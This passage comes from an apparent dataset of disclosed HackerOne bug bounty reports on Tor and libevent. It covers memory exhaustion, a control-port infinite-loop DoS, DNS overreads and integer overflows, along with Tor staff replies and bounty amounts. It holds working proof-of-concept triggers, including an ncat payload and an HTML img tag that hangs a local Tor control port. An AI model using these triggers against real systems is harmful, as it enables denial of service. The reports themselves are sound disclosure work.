34    tor-0.2.7.6/src/or/directory.c:2138
35        if i2d_RSAPublicKey fails, service_id is left uninitialized XXX
36    tor-0.2.7.6/src/or/rendservice.c:3250
37        if i2d_RSAPublicKey fails, service_id is left uninitialized XXX
i2d_RSA_PublicKey does a memory allocation internally and a shortage of allocatable memory will cause it to fail. Like I said in the other report, a repeatedly triggered memory leak by the attacker, or utilizing some way to allocate a large amount of memory, or a ""natural"" memory shortage on the system caused by another process using large amounts of memory could trigger this.
Here is a proof of concept:
Code 1.38 KiBWrap lines Copy Download1#include <openssl/sha.h>
2#include <stdio.h>
3#include <stdlib.h>
4#include <openssl/rsa.h>
5
6#define tor_assert(x) {if (!(x)) { abort(); }}
7
8struct crypto_pk_t
9{
10  int refs; /**< reference count, so we don't have to copy keys */
11  RSA *key; /**< The key itself */
12};
13typedef struct crypto_pk_t crypto_pk_t;
14int
15crypto_digest(char *digest, const char *m, size_t len)
16{
17  tor_assert(m);
18  tor_assert(digest);
19  return (SHA1((const unsigned char*)m,len,(unsigned char*)digest) == NULL);
20}
21int
22crypto_pk_get_digest(const crypto_pk_t *pk, char *digest_out)
23{
24  unsigned char *buf = NULL;
25  int len;
26
27  len = i2d_RSAPublicKey((RSA*)pk->key, &buf);
28  if (len < 0 || buf == NULL)
29    return -1;
30  if (crypto_digest(digest_out, (char*)buf, len) < 0) {
31    OPENSSL_free(buf);
32    return -1;
33  }
34  OPENSSL_free(buf);
35  return 0;
36}
37
38#define DIGEST_LEN 20
39int main(void)
40{
41    char _digest[DIGEST_LEN];
42    char digest[] = ""uninitialized mem.."";
43
44    if ( sizeof(_digest) != sizeof(digest) )
45    {
46        return 0;
47    }
48    void* ptr = (void*)1;
49    int count = 0;
50    crypto_pk_t* pk = malloc(sizeof(crypto_pk_t));
51
52    pk->key = RSA_generate_key(1024, 3, 0, 0);
53
54    while ( ptr != 0 )
55    {
56        ptr = malloc(100);
57        count ++;
58    }
59
60    printf(""allocated 100 * %d bytes\n"", count);
61    printf(""crypto_pk_digest returns: %d\n"", crypto_pk_get_digest(pk, digest));
62
63    printf(""digest is: %s\n"", digest);
64    return 0;
65}
Before you run this, you might want to run this command:
Code 17 BytesWrap lines Copy Download1ulimit -Sv 500000
so that process memory is limited to 500MB (so your whole system doesn't start lagging).
It should output something like this:
Code 89 BytesWrap lines Copy Download1allocated 100 * 4477420 bytes
2crypto_pk_digest returns: -1
3digest is: uninitialized mem..
In other words, digest is not touched by crypto_pk_digest() and retains it original value.
Guido",https://hackerone.com/reports/142773,England,United Kingdom,Cambridge,2016,6,2,23,53
Tor,51-100,1.0,1m-10m,$100.00,No value,0.0,Denial of Service,[tor] control connection pre-auth DoS (infinite loop) with --enable-bufferevents,"guido  submitted a report to Tor.Jan 29th (7 years ago)In control.c, this is the loop that retrieves data from the input buffer of the connection, or returns if no complete linefreed-terminated line is available (connection_fetch_from_buf_line() returns 0).
Code 1.06 KiBWrap lines Copy Download14225   while (1) {
24226     size_t last_idx;
34227     int r;
44228     /* First, fetch a line. */
54229     do {
64230       data_len = conn->incoming_cmd_len - conn->incoming_cmd_cur_len;
74231       r = connection_fetch_from_buf_line(TO_CONN(conn),
84232                               conn->incoming_cmd+conn->incoming_cmd_cur_len,
94233                               &data_len);
104234       if (r == 0)
114235         /* Line not all here yet. Wait. */
124236         return 0;
134237       else if (r == -1) {
144238         if (data_len + conn->incoming_cmd_cur_len > MAX_COMMAND_LINE_LENGTH) {
154239           connection_write_str_to_buf(""500 Line too long.\r\n"", conn);
164240           connection_stop_reading(TO_CONN(conn));
174241           connection_mark_and_flush(TO_CONN(conn));
184242         }
194243         while (conn->incoming_cmd_len < data_len+conn->incoming_cmd_cur_len)
204244           conn->incoming_cmd_len *= 2;
214245         conn->incoming_cmd = tor_realloc(conn->incoming_cmd,
224246                                          conn->incoming_cmd_len);
234247       }
244248     } while (r != 1);
If connection_fetch_from_buf_line() returns -1, this means that the buffer (conn->incoming_cmd) is not large enough. conn->incoming_cmd_len is then increased to a size sufficiently large to hold the incoming command (lines 4243 - 4246). In order for this to work, data_len must be set to this required size by connection_fetch_from_buf_line().
If libevent bufferevents are not enabled, then connection_fetch_from_buf_line() is simply a proxy function for fetch_from_buf_line():
Code 110 BytesWrap lines Copy Download13785   }) ELSE_IF_NO_BUFFEREVENT {
23786     return fetch_from_buf_line(conn->inbuf, data, data_len);
33787   } 
This function will indeed set *data_len to the required size if the present buffer size is too small (line 2255):
Code 526 BytesWrap lines Copy Download12241 int
22242 fetch_from_buf_line(buf_t *buf, char *data_out, size_t *data_len)
32243 {
42244   size_t sz;
52245   off_t offset;
62246 
72247   if (!buf->head)
82248     return 0;
92249     
102250   offset = buf_find_offset_of_char(buf, '\n');
112251   if (offset < 0)
122252     return 0;
132253   sz = (size_t) offset;
142254   if (sz+2 > *data_len) {
152255     *data_len = sz + 2;
162256     return -1;
172257   } 
182258   fetch_from_buf(data_out, sz+1, buf);   
192259   data_out[sz+1] = '\0';
202260   *data_len = sz+1; 
212261   return 1;
222262 }   
However, if libevent bufferevents are enabled (by ./configuring tor with --enable-bufferevents), then the code on lines (3770 - 3784) is executed instead:
Code 884 BytesWrap lines Copy Download13765 int 
23766 connection_fetch_from_buf_line(connection_t *conn, char *data,
33767                                size_t *data_len)
43768 {   
53769   IF_HAS_BUFFEREVENT(conn, {
63770     int r;
73771     size_t eol_len=0;
83772     struct evbuffer *input = bufferevent_get_input(conn->bufev);
93773     struct evbuffer_ptr ptr =
103774       evbuffer_search_eol(input, NULL, &eol_len, EVBUFFER_EOL_LF);
113775     if (ptr.pos == -1)
123776       return 0; /* No EOL found. */
133777     if ((size_t)ptr.pos+eol_len >= *data_len) {
143778       return -1; /* Too long */
153779     }     
163780     *data_len = ptr.pos+eol_len;
173781     r = evbuffer_remove(input, data, ptr.pos+eol_len);
183782     tor_assert(r >= 0);
193783     data[ptr.pos+eol_len] = '\0';
203784     return 1;
213785   }) ELSE_IF_NO_BUFFEREVENT {            
223786     return fetch_from_buf_line(conn->inbuf, data, data_len);
233787   }
243788 }
Following the size check on line 3777, *data_len is not altered and thus remains the same as before the invocation.
For incoming data larger than the initial buffer size (1024 bytes) and contains a linefeed character past 1024 bytes, this sends the control connection input routine into an infinite loop.
Proof of concept
$ ./configure --enable-bufferevents && make -j4
Now start tor with this torrc:
ControlPort 9999
then in another terminal:
$ cat genpoc.py
import sys
sys.stdout.write((chr(0x63) * 2000) + chr(0x0A) )
$ python genpoc.py >poc
$ ncat localhost 9999 <poc
tor now hangs and has to be killed with force (kill -9 <pid>).
Inter-protocol exploit
Since the only two prerequisites of the attack are:

Input longer than 1024 bytes
Input contains linefeed character after byte 1024

it's easy to think of other ways of making tor hang than manually creating a connection for this purpose.
Code 116 BytesWrap lines Copy Download1$ cat genpoc2.py 
2print ""curl http://localhost:9999/{}"".format(""x"" * 1200)
3$ python genpoc2.py >poc.sh
4$ bash poc.sh
This also causes tor to hang, because curl is sending this to tor:
Code 1.49 KiBWrap lines Copy Download1GET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx HTTP/1.1
2User-Agent: curl/7.35.0
3Host: localhost:9999
4Accept: */*
5
6```
7
8which is data that adheres to the prerequisites.
9
10Thus, a person running tor with the control server running locally while also using a regular browser can be DoSed via:
11
12```html
13<img src='http://localhost:9999/xxxxxxxxxxxxxxxxxxx...'>
14```
15
16Guido",https://hackerone.com/reports/113424,England,United Kingdom,Cambridge,2016,1,29,5,43
Tor,51-100,1.0,1m-10m,$200.00,No value,0.0,Memory Corruption - Generic,[tor] libevent dns OOB read,"guido  submitted a report to Tor.Feb 10th (7 years ago)The DNS code of Libevent contains this rather obvious OOB read:
Code 250 BytesWrap lines Copy Download13122 static char *
23123 search_make_new(const struct search_state *const state, int n, const char *const base_name) {
33124     const size_t base_len = strlen(base_name);
43125     const char need_to_append_dot = base_name[base_len - 1] == '.' ? 0 : 1;
If the length of base_name is 0, then line 3125 reads 1 byte before the buffer. This will trigger a crash on ASAN-protected builds.
To reproduce:
Build libevent with ASAN:
Code 74 BytesWrap lines Copy Download1$ CFLAGS='-fomit-frame-pointer -fsanitize=address' ./configure && make -j4
Put the attached resolv.conf and poc.c in the source directory and then do:
Code 320 BytesWrap lines Copy Download1$ gcc -fsanitize=address -fomit-frame-pointer poc.c .libs/libevent.a
2$ ./a.out
3=================================================================
4==22201== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060000efdf at pc 0x4429da bp 0x7ffe1ed47300 sp 0x7ffe1ed472f8
5READ of size 1 at 0x60060000efdf thread T0
This happens because I create a zero-length string in poc.c:
Code 86 BytesWrap lines Copy Download1    char* hostname = malloc(32);
2    memset(hostname, 0, 32);
3    //hostname[0] = 'x';
If you uncomment the last line, it will not crash.
Guido2 attachments:F72902: resolv.confF72903: poc.c",https://hackerone.com/reports/115702,England,United Kingdom,Cambridge,2016,2,10,14,43
Tor,51-100,1.0,1m-10m,$500.00,No value,0.0,Memory Corruption - Generic,[tor] libevent dns remote stack overread vulnerability,"guido  submitted a report to Tor.Jan 25th (7 years ago)Hello,
the name_parse function in libevent's DNS code is vulnerable to a buffer overread.
Code 2.25 KiBWrap lines Copy Download1 935 static int
2 936 name_parse(u8 *packet, int length, int *idx, char *name_out, int name_out_len) {
3 937     int name_end = -1;
4 938     int j = *idx;
5 939     int ptr_count = 0;
6 940 #define GET32(x) do { if (j + 4 > length) goto err; memcpy(&_t32, packet + j, 4); j += 4; x = ntohl(_t32); } while      (0)
7 941 #define GET16(x) do { if (j + 2 > length) goto err; memcpy(&_t, packet + j, 2); j += 2; x = ntohs(_t); } while (0)
8 942 #define GET8(x) do { if (j >= length) goto err; x = packet[j++]; } while (0)
9 943 
10 944     char *cp = name_out;
11 945     const char *const end = name_out + name_out_len;
12 946 
13 947     /* Normally, names are a series of length prefixed strings terminated */
14 948     /* with a length of 0 (the lengths are u8's < 63). */
15 949     /* However, the length can start with a pair of 1 bits and that */
16 950     /* means that the next 14 bits are a pointer within the current */
17 951     /* packet. */
18 952 
19 953     for (;;) {
20 954         u8 label_len;
21 955         if (j >= length) return -1;
22 956         GET8(label_len);
23 957         if (!label_len) break;
24 958         if (label_len & 0xc0) {
25 959             u8 ptr_low;
26 960             GET8(ptr_low);
27 961             if (name_end < 0) name_end = j;
28 962             j = (((int)label_len & 0x3f) << 8) + ptr_low;
29 963             /* Make sure that the target offset is in-bounds. */
30 964             if (j < 0 || j >= length) return -1;
31 965             /* If we've jumped more times than there are characters in the
32 966              * message, we must have a loop. */
33 967             if (++ptr_count > length) return -1;
34 968             continue;
35 969         }
36 970         if (label_len > 63) return -1;
37 971         if (cp != name_out) {
38 972             if (cp + 1 >= end) return -1;
39 973             *cp++ = '.';
40 974         }
41 975         if (cp + label_len >= end) return -1;
42 976         memcpy(cp, packet + j, label_len);
43 977         cp += label_len;
44 978         j += label_len;
45 979     }
46 980     if (cp >= end) return -1;
47 981     *cp = '\0';                                                                                                   
48 982     if (name_end < 0)
49 983         *idx = j;
50 984     else
51 985         *idx = name_end;
52 986     return 0;
53 987  err:
54 988     return -1;
55 989 }
Prior to the memcpy on line 976 it is not asserted that the range (packet + j) - (packet + j + label_len) does not exceed the length of the packet buffer (as stored in variable length). My proof of concept exploits the possibility to keep jumping around in the buffer (lines 959 - 968), until the buffer index (j) is at the very end --- then, an overread of 63 bytes will occur. No overwrite takes place.
As you know, an overread may result in a crash, depending on a variety of factors.
I believe the code in Tor is vulnerable and I will update this report with PoC against Tor itself as soon as I've constructed one.
Nobody has been notified of this bug except you. I will not contact the libevent developers about this issue unless you explicitly request so. It's up to you to notify them yourself.
To test against the latest version of libevent (libevent-2.0.22-stable.tar.gz):
Code 106 BytesWrap lines Copy Download1CFLAGS=""-fomit-frame-pointer -fsanitize=address"" ./configure
2make -j4
3cd samples
4./dns-example -servertest
in a different terminal run
Code 22 BytesWrap lines Copy Download1python libevent-poc.py
Output of dns-example should be:
Code 292 BytesWrap lines Copy Download1EVUTIL_AI_CANONNAME in example = 2
2=================================================================
3==27496== ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffcf5a7355c at pc 0x7f6096a6b652 bp 0x7ffcf5a72bb0 sp 0x7ffcf5a72ba8
4READ of size 1 at 0x7ffcf5a7355c thread T0
5
6...
7...
Guido1 attachment:F70753: libevent-poc.pyasn   posted a comment. Jan 25th (7 years ago)Hello and thanks for the bug and the great report!
We are currently trying to see how this fits into our reward program.
As you can see in the bug rewards text we were not planning to pay out ""low severity"" vulnerabilities to third party libraries like libevent.
Still, this seems like a nice bug, so we would like to reward it somehow!
We also want to check if this can be a DoS vector for Tor relays or dirauths.
We will get back to you ASAP!guido   posted a comment. Jan 25th (7 years ago)Thanks!
Are you interested in a heap corruption/crash vulnerability in libevent that probably affects tor if it opens a specially crafted /etc/hosts ?
Guidoasn   posted a comment. Jan 25th (7 years ago)Hello friend!
With regards to the /etc/hosts bug, I think such a bug would be out of scope for the bug bounty program, but it would still be a nice bug to fix.
We would still be happy to credit you with the discovery of the bug of course :)
Coming back to you soon about the reward of this bug.The Internet Bug Bounty  rewarded guido with a $500 bounty. Jan 26th (7 years ago)Hello friend!
We decided $500 as the price of this bug. Out-of-bounds bugs are not super dangerous, but the potential of crashing exit nodes (that parse DNS queries with name_parse()) is concerning.
You are our first bug hunter! Thanks!
Please let us know if you would like to not be credited ,or be credited with a special name.
Otherwise, we will just credit you as ""guido"".
We will start fixing the bug ASAP. When we do, we will post the patch here, so that you check it out if you want.
Cheers!guido   posted a comment. Jan 26th (7 years ago)Thank you very much!
You may credit me as: Guido Vrankenasn   posted a comment. Jan 27th (7 years ago)Hello. We filed this bug here: https://github.com/libevent/libevent/issues/317
Will close this issue when the patch gets merged.geko Tor staff  changed the status to Triaged. Jan 28th (7 years ago)asn   closed the report and changed the status to Resolved. Feb 5th (7 years ago)This has been handled by the libevent team here:
https://github.com/libevent/libevent/commit/96f64a022014a208105ead6c8a7066018449d86d
Please let us know if the fix is not sufficient.
Thanks!geko Tor staff  requested to disclose this report. Oct 19th (5 years ago)guido   agreed to disclose this report. Oct 19th (5 years ago)  This report has been disclosed. Oct 19th (5 years ago)",https://hackerone.com/reports/112632,England,United Kingdom,Cambridge,2016,1,25,2,27
Tor,51-100,1.0,1m-10m,$500.00,No value,0.0,Violation of Secure Design Principles,"[tor] pre-emptive defenses, potential vulnerabilities","guido  submitted a report to Tor.Feb 10th (7 years ago)Replacing all tor_malloc calls with tor_calloc and tor_malloc_zero
Zeroing memory upon allocating it will prevent vulnerabilities that consist of transmitting data buffers which are not wholly initialized with the intended data (or contain remnants of previous contents).
Pseudocode:
Code 83 BytesWrap lines Copy Download1char* outbuffer = tor_malloc(100);
2memcpy(outbuffer, inbuffer, i);
3send(outbuffer);
If i is the result of a calculation whose outcome is presumed to align with the outbuffer's size (100), but in practice is prone to a corner-case where the result is in fact less than 100, then whatever uninitialized memory is present in the allocated heap memory will be transmitted to the other party.
But if you're using tor_malloc_zero instead, then the uninitialized memory would simply consist of zeroes, and thus useless for a malicious recipient of the buffer.
tor_calloc is like tor_malloc_zero in that it zeroes the allocated memory before disclosing it to the invoking function, and moreover has the property of accepting two size_t parameters and verifying whether the product (result of multiplication) is prone to an overflow, and fails if it is. Therefore, it is ideal to use as a substitute for manual multiplication in preparation for a tor_malloc or tor_malloc_zero:
Code 38 BytesWrap lines Copy Download1tor_malloc(n * sizeof(some_struct_t));
In instances such as this, it is again presumed that the product of n and the sizeof cannot result in an overflow. Even when this is fairly obvious, I'd say there is no reason to delegate the multiplication to tor_calloc that offers a hard guarantee that the multiplication is safe. As your code grows, and the value of n starts hinging on factors that may not be immediately obvious, or if fields are added to some_struct_t in order to cater to future requirements, overflows may become a reality without the protection that tor_calloc offers.
Potential heap corruption via write_escaped_data in control.c
/** Given a <b>len</b>-character string in <b>data</b>, made of lines

terminated by CRLF, allocate a new string in *<b>out</b>, and copy the
contents of <b>data</b> into *<b>out</b>, adding a period before any period
that appears at the start of a line, and adding a period-CRLF line at
the end. Replace all LF characters sequences with CRLF.  Return the number
of bytes in <b>out</b>.
/
STATIC size_t
write_escaped_data(const char data, size_t len, char **out)
{
size_t sz_out = len+8;
char outp;
const char start = data, end;
int i;
int start_of_line;
for (i=0; i<(int)len; ++i) {
if (data[i]== '\n')
sz_out += 2; / Maybe add a CR; maybe add a dot. /
}
out = outp = tor_malloc(sz_out+1);
end = data+len;
start_of_line = 1;
while (data < end) {
if (data == '\n') {
if (data > start && data[-1] != '\r')
outp++ = '\r';
start_of_line = 1;
} else if (data == '.') {
if (start_of_line) {
start_of_line = 0;
outp++ = '.';
}
} else {
start_of_line = 0;
}
outp++ = data++;
}
if (outp < out+2 || fast_memcmp(outp-2, ""\r\n"", 2)) {
outp++ = '\r';
outp++ = '\n';
}
outp++ = '.';
outp++ = '\r';
outp++ = '\n';
outp = '\0'; / NUL-terminate just in case. /
tor_assert((outp - out) <= (int)sz_out);
return outp - out;
}

There are two potential vulnerabilities lurking here:

If the input size (len) >= 0x80000000, then this loop will not execute at all:


Code 116 BytesWrap lines Copy Download1  for (i=0; i<(int)len; ++i) {
2    if (data[i]== '\n')
3      sz_out += 2; /* Maybe add a CR; maybe add a dot. */
4  }
Because the condition i<(int)len is effectively i<(negative number) and i is intialized to 0, this can never be true. As a result of this, the output buffer (whose size is based on sz_out) is too small to hold the result for an input buffer containing '\n' characters.
Triggering this is typically only feasible on a 64-bit system, because if the input buffer is >= 0x80000000 bytes, then sz_out is set to 0x80000008 bytes, and allocating such an amount twice (one for the input buffer, and one for the output buffer) is not possible on a 32-bit system.

If the equation (number of '\n' characters in input buffer * 2 + size of input buffer) exceeds 0xFFFFFFFF, then this will cause heap corruption on a 32-bit system, because sz_out overflows.

See my attached proof of concept. Compile and execute like this:
Code 156 BytesWrap lines Copy Download1gcc -fsanitize=address -fomit-frame-pointer write_escaped_data.c; ./a.out 1
2gcc -m32 -fsanitize=address -fomit-frame-pointer write_escaped_data.c; ./a.out 2
As for real exploitability, I spent some effort on creating a real, remote proof of concept for this, but because the data that write_escaped_data may process is the result a multitude of (to me) intricate processes it is hard to come up with a reliable attack.
write_escaped_data draws data from all the getinfohelper* functions (via handle_control_getinfo and handle_getinfo_helper) as well as the amalgate of many potentially many, reasonably large strings in control_event_networkstatus_changed_helper: 
Code 268 BytesWrap lines Copy Download1  SMARTLIST_FOREACH(statuses, const routerstatus_t *, rs,
2    {
3      s = networkstatus_getinfo_helper_single(rs);
4      if (!s) continue;
5      smartlist_add(strs, s);
6    });
7
8  s = smartlist_join_strings(strs, """", 0, NULL);
9  write_escaped_data(s, strlen(s), &esc);
base64_decode potential heap corruption on 32-bit systems
Code 179 BytesWrap lines Copy Download1int
2base64_decode(char *dest, size_t destlen, const char *src, size_t srclen)
3{
4...
5...
6  if (destlen < (srclen*3)/4)
7    return -1;
8  if (destlen > SIZE_T_CEILING)
9    return -1;
The problem here is that the multiplication (by 3) occurs before the division (by 4).
For source strings larger than 0xFFFFFFFF / 3 == 0x55555555, an overflow will occur within this calculation. If the result of the overflow-affected calculation is smaller than what destlen is, then this check will be passed and memory will be corrupted.
See my proof of concept:
Code 273 BytesWrap lines Copy Download1$ gcc -m32 -fsanitize=address -fomit-frame-pointer base64_decode.c; ./a.out 
2=================================================================
3==32449== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xfff6fe04 at pc 0x804898b bp 0xfff6fcf8 sp 0xfff6fcec
4...
5...
Potential heap corruption in do_getpass in routerkeys.c
At present this cannot be triggered, but, unless this code was designed like this on purpose and you're aware of the weakness, you might want to revisit it.
do_getpass contains this code:
Code 329 BytesWrap lines Copy Download1  if (twice) {
2    const char msg[] = ""One more time:"";
3    size_t p2len = strlen(prompt) + 1;
4    if (p2len < sizeof(msg))
5      p2len = sizeof(msg);
6    prompt2 = tor_malloc(strlen(prompt)+1);
7    memset(prompt2, ' ', p2len);
8    memcpy(prompt2 + p2len - sizeof(msg), msg, sizeof(msg));
9
10    buf2 = tor_malloc_zero(buflen);
11  }
There is only one call to this function in the code for which twice == 1:
Code 171 BytesWrap lines Copy Download1  if (do_getpass(""Enter new passphrase:"", pwbuf0, sizeof(pwbuf0), 1,
2                 get_options()) < 0) {
3    log_warn(LD_OR, ""NO/failed passphrase"");
4    return -1;
5  }
This will not trigger a memory corruption, but if the first parameter had been shorter, it would:
Compile and run like this:
Code 470 BytesWrap lines Copy Download1$ gcc -fomit-frame-pointer -fsanitize=address do_getpass.c 
2$ ./a.out ""Enter new passphrase:""
3$ ./a.out ""Enter new passphrase""
4$ ./a.out ""Enter new passphras""
5$ ./a.out ""Enter new passphra""
6$ ./a.out ""Enter new passphr""
7$ ./a.out ""Enter new passph""
8$ ./a.out ""Enter new passp""
9$ ./a.out ""Enter new pass""
10$ ./a.out ""Enter new pas""
11
12==7883== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60040000dffe at pc 0x400c0a bp 0x7fff8d9c22e0 sp 0x7fff8d9c22d8
13...
14...
So it's not really a vulnerability at present, but I thought I'd mention it to you since it struck me as odd and it could become a problem if you pass a dynamic, potentially short string (for ex. created with snprintf) to do_getpass.3 attachments:F72882: do_getpass.cF72883: base64_decode.cF72884: write_escaped_data.cguido   posted a comment. Feb 10th (7 years ago)Looks like I ruined the layout a bit in the write_escaped_data chapter, I had meant to put the listing of that function there.asn   posted a comment. Feb 13th (7 years ago)Hello guido,
thanks for the new bug reports!
I'll forward them to more Tor devs tomorrow, and handle them all next week.
Let me know if you are in a hurry and I will allocate extra resources to this end.
Thanks!guido   posted a comment. Feb 13th (7 years ago)Not in a hurry, take your time :).
Guidoguido   posted a comment. Mar 2nd (7 years ago)Hi, could you please comment on this one?asn   posted a comment. Mar 3rd (7 years ago)Hello there,
the fact that this report contains multiple bugs makes it hard to analyze and figure out it's reward.
After discussion with other Tor devs, we are mainly concerned about the bug in write_escaped_data but we can't find a nice way to remotely trigger it either.
The base64_decode() bug is also interesting but we couldn't find a place where we call it with such huge strings from the network.  The size of most directory documents are restricted by size. If you can find such a codepath, please let us know.
With the current state of this bug report, we are considering rewarding $500 to this bug report, mainly because of the two bugs above.
I will let this open some more in case you get more time to analyze this.
Thanks again!The Internet Bug Bounty  rewarded guido with a $500 bounty. Mar 8th (7 years ago)Awarding $500 here. Will update the ticket when we file the bugs on the bug tracker.
Thanks!guido   posted a comment. Mar 8th (7 years ago)Thanks!!geko Tor staff  changed the status to Triaged. Mar 23rd (7 years ago)guido   posted a comment. May 26th (6 years ago)Can this one too be marked as ""resolved"" when you're ready? Thanks.asn   closed the report and changed the status to Resolved. May 26th (6 years ago)there you go. Sorry. Pretty new to this hackerone thing :)asn   requested to disclose this report. Oct 27th (5 years ago)Handled as part of tor's tickets #19281 and #19222.  This report has been disclosed. Nov 26th (5 years ago)",https://hackerone.com/reports/115686,England,United Kingdom,Cambridge,2016,2,10,12,2
Tor,51-100,1.0,1m-10m,$300.00,No value,0.0,Memory Corruption - Generic,Heap corruption via memarea.c,"guido  submitted a report to Tor.May 11th (7 years ago)Hello again,
There is a potential vulnerability in memarea.c.
common/memarea.c:
Code 317 BytesWrap lines Copy Download1230 void *
2231 memarea_alloc(memarea_t *area, size_t sz)
3232 {
4233   memarea_chunk_t *chunk = area->first;
5234   char *result;
6235   tor_assert(chunk);
7236   CHECK_SENTINEL(chunk);
8237   tor_assert(sz < SIZE_T_CEILING);
9238   if (sz == 0)
10239     sz = 1;
11240   if (chunk->next_mem+sz > chunk->U_MEM+chunk->mem_size) {
The vulnerability lies in the addition of a pointer and an integer on line 240:
Code 32 BytesWrap lines Copy Download1240   if (chunk->next_mem+sz ...
To which address chunk->next_mem points is not within the application's (tor) purview, since it originates from within malloc() (which is accessed via tor_malloc()) and to some extent the system's kernel memory management), and malloc() is implemented in the libc with which tor was linked.
My point is that no or few assumptions can be made about the virtual address to which chunk->next_mem points.
sz is variable and may be influenced by an external party on the network.
Furthermore, it is guaranteed that sz is smaller than SIZE_T_CEILING, which is 0x80000000 on 32 bit:
Code 32 BytesWrap lines Copy Download1tor_assert(sz < SIZE_T_CEILING);
The above predicates imply that 1) given a 32 bit system, where 2) chunk->next_mem happens to point to a virtual address of 0x80000000 or higher and 3) sz >= 0x100000000 - chunk->mem_next an overflow will occur in the addition of the pointer chunk->next_mem+sz, thus unduly evading this check, which was meant to assert whether is sufficient memory in the current block.
In other words, if chunk->next_mem is 0xA0000000, and memarea_alloc is called to request 0x60000000 bytes, then the following will happen:
Code 449 BytesWrap lines Copy Download1230 void *
2231 memarea_alloc(memarea_t *area, size_t sz)
3232 {     
4233   memarea_chunk_t *chunk = area->first;
5234   char *result;
6235   tor_assert(chunk);
7236   CHECK_SENTINEL(chunk);
8237   tor_assert(sz < SIZE_T_CEILING);
9238   if (sz == 0)
10239     sz = 1;
11240   if (chunk->next_mem+sz > chunk->U_MEM+chunk->mem_size) {
12...
13...   This code is not executed
14...
15254   } 
16255   result = chunk->next_mem;
17256   chunk->next_mem = chunk->next_mem + sz;
In this case, line 256 translate to:
Code 48 BytesWrap lines Copy Download1256   chunk->next_mem = 0xA0000000 + 0x60000000;
Eg. chunk->next_mem now equals 0.
The higher the value of chunk->next_mem, and the higher the maximum value of sz that a potential attacker can enforce to be allocated, the higher the odds of yielding a chunk->next_mem value that points to real data (eg. a block of heap memory allocated by tor).
I've used 32 bit in this example. 64 bit is theoretically possible too (SIZE_T_CEILING is larger on 64 bit as well), but less likely.
An easy way to test this is by changing this line in memarea.c alloc_chunk():
Code 29 BytesWrap lines Copy Download1res = tor_malloc(chunk_size);
to
Code 101 BytesWrap lines Copy Download1res = mmap((void*)0xF0000000, chunk_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
(also include #include <sys/mman.h>)
then this code will trigger a segmentation fault
Code 119 BytesWrap lines Copy Download1  memarea_t *area;
2  area = memarea_new();
3  char *mem = memarea_alloc(area, 0x10000000);
4  memset(mem, 0, 0x10000000);
(be aware that this example applies to 32 bit, so compile with CFLAGS=""-m32"")
Guido",https://hackerone.com/reports/138025,England,United Kingdom,Cambridge,2016,5,11,20,0
Tor,51-100,1.0,1m-10m,$100.00,Low,2.0,Privacy Violation,languagechange event fires simultaneously on all tabs,"tomvg  submitted a report to Tor.Aug 8th (5 years ago)The languagechange event, which fires when the user modifies the browser's language settings fires simultaneously on all tabs. This would allow an adversary to link multiple visits to a single user: the adversary (e.g. a malicious ad provider) has a script that listens for this event, and when fired sends a signal to the adversary's server which includes the timestamp of the event. Since this is an event that does not occur very often (only when the user changes the browser's language), so the chances that this event occurs at the exact same millisecond on with multiple users is very small.
I believe this has been a small oversight, since the online and offline events do seem to be disabled because of this threat.
PoC
